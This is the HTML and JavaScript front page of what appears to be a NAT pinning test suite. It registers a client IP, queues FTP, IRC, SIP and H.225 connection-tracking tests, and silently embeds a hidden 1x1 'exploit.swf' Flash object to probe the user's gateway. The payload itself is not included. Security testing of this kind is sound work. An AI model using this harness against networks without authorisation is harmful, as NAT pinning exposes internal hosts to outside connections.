<html>
	<head>
		<title>Gremwell NAT Pinning test suite</title>
	</head>
	<body onload="">
	 <script type="text/javascript" src="--admin.js"></script>
	<link rel="STYLESHEET" type="text/css" media="screen" href="admin.css" />
	 <script language="JavaScript">
			var gCurrStep=1;
			var gMyIP="";
			var gClientId="";
			var gCmdURL=document.URL.replace("/admin.html","");
			function isNumber(n) {
  				return !isNaN(parseFloat(n)) && isFinite(n);
			}
			function isValidIp4(s){
				var parts = s.split(".");
				if (parts.length !=4){
					return false;					
				}
				for (var i = 0; i < parts.length; i++) {
					if (isNumber(parts[i])==false){
						return false;
					}else{
						var block = parseInt(parts[i]);
						if (block<0||block>255){
							return false;
						} 
					}
				}
				return true;
			}
			function createSwfObject(src, attributes, parameters) {
  				var i, html, div, obj, attr = attributes || {}, param = parameters || {};
  				attr.type = 'application/x-shockwave-flash';
  				if (window.ActiveXObject) {
    					attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';
    					param.movie = src;
  				}
	  			else {
	    				attr.data = src;
	  			}
				html = '<object';
	  				for (i in attr) {
	   					html += ' ' + i + '="' + attr[i] + '"';
	  				}
	  			html += '>';
	  			for (i in param) {
	    				html += '<param name="' + i + '" value="' + param[i] + '" />';
	  				}
	  			html += '</object>';
	  			div = document.createElement('div');
	  			div.innerHTML = html;
	  			obj = div.firstChild;
	  			div.removeChild(obj);
	  			return obj;
				};
			function loadSWF(){
				var proto = "cmd";
				var server = document.location.hostname;//defaulting to same host
				var callbackip = "";
				var callbackport = "";
				//where dragons be
				var swfEl = createSwfObject('exploit.swf', {id: 'myid', class: 'myclass', width: 1, height: 1}, {wmode: 'transparent',allowScriptAccess: 'allways', FlashVars : 'ci='+ gClientId +'&server='+ server +'&cmdURL='+gCmdURL});
				document.body.appendChild(swfEl);
			}
			function httpreq(url){
				var xmlhttp;
				if (window.XMLHttpRequest){ // works with IE7+, Chrome, Firefox, Safari
					xmlhttp=new XMLHttpRequest();
				}else{ // works with IE6, IE5
    					xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
				}
				xmlhttp.open('GET', url, false);  // `false` makes the request synchronous
				xmlhttp.send(null);
				if (xmlhttp.status === 200) {
 					return xmlhttp.responseText;
				}else{
					return "";
				}
			}
			function regclient(ip){
				return httpreq("/CLI?REG_"+gMyIP);
				//returns client id or empty string on error
			}
			function addTest(proto,ip,port){
				var testid = httpreq("/cli?ADD_"+gClientId+"_"+proto+"_"+ip+"_"+port);
			}
			function displayStep(){
				var step1= document.getElementById("Step1");
				var step2= document.getElementById("Step2");
				var step3= document.getElementById("Step3");
				if (gCurrStep==1){
					step1.style="display:block;";
					step2.style="display:none;";
					step3.style="display:none;";
				}
				if (gCurrStep==2){
					step1.style="display:none;";
					step2.style="";
					step3.style="display:none;";
				}
				if (gCurrStep==3){
					step1.style="display:none;";
					step2.style="display:none;";
					step3.style="display:block;";
				}
			}
			function nextStep(){
				if (gCurrStep==1){
					var strMyIp = document.getElementById("step1_myIP").value;
					if(isValidIp4(strMyIp)){
						gMyIP=strMyIp;
						gClientId = regclient(gMyIP);
						addTest("FTP",gMyIP,"65000");
						addTest("IRC",gMyIP,"65001");
						addTest("SIP",gMyIP,"65002");
						addTest("H225",gMyIP,"65003");
						if (gClientId!=""){
							gCurrStep=2;
							displayStep();
							loadSWF();
							document.getElementById("Errmsg").innerHTML=" ";
						}else{
							document.getElementById("Errmsg").innerHTML="Failed to retrieve client id from server.";
						}
					}else{
						document.getElementById("Errmsg").innerHTML="Invalid IP address.";
						document.getElementById("step1_myIP").focus();
					}
				}
			}
	 </script>
	 <p>
	<div id="Step1" class="MainContainer"style="display:block" >
		<center><img src="gremwell_logo.png" class="img_logo" /></center>
		<div class="main_text">To continue, we will require the following information from you:</div>
			<br /><br />
			<div class="main_text">Your client's IP address: <input class="step_input" id="step1_myIP" value="" len="15"></div>
			<br /><br />
	</div>
	<div id="Step2" class="MainContainer" style="display:none">
		<div class="main_text"><br />We are now going to determine which connection tracking modules are loaded on your gateway.
		<br />
		<ul>
			<li id="li_FTP">FTP ...</li>
			<li id="li_IRC">IRC ...</li>
			<li id="li_SIP">SIP ...</li>			
			<li id="li_H225">H.225 ...</li>
		</ul>
		</div>
	</div>
	<div id="Step3" class="MainContainer" style="display:none">
		pownage
	</div>
	<div id="ButtonFrame" class="ButtonFrame">
		<div id="Errmsg" class="errmsg"> </div>
		<center><input type=button class=step_next id=step1_next onclick="nextStep();" value="Proceed"/></center>
	</div>
	<div id="SWFContainer"></div>
	 </center>
	</body>
</html>
